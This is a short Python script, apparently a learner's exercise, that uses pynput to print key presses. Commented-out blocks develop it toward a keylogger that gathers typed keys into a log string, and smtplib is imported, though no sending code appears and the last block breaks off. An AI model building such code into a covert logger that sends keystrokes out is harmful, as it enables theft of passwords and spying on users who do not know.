# -*- coding: utf-8 -*-
"""
Created on Sun Oct  1 18:29:40 2023

@author: Shafi
"""

import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    print("{0} pressed".format(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()

"""
import threading

import smtplib

def grab_keys(key):
    print(key)
listener = kb.Listener(on_press = grab_keys)

with listener :
    listener.join()

log = ""
def grab_keys(key):
    global log
    try:
        log = log + str(key.char)
    except Exception:
        log += " " + str(key) + " "
    print (log)

listener = kb.Listener(on_press = grab_keys)

with listener:
    listener.join()

"""

"""

log = ""
caps = False
count = 0
def grab_keys(key):
    global log,caps,count
    #case = False
    try :
        if caps:
            log = log + str(key.char).swapcase()
        else:
            log = log + str(key.char)
    except Exception:
        if str(key) == 'Key.space':
            log += " "
        elif str(key) == 'Key.shift':
            pass
        elif str(key) == 'Key.backspace':
            log = log[:-1]
        elif str(key) == 'Key.caps_lock':
            case = True
"""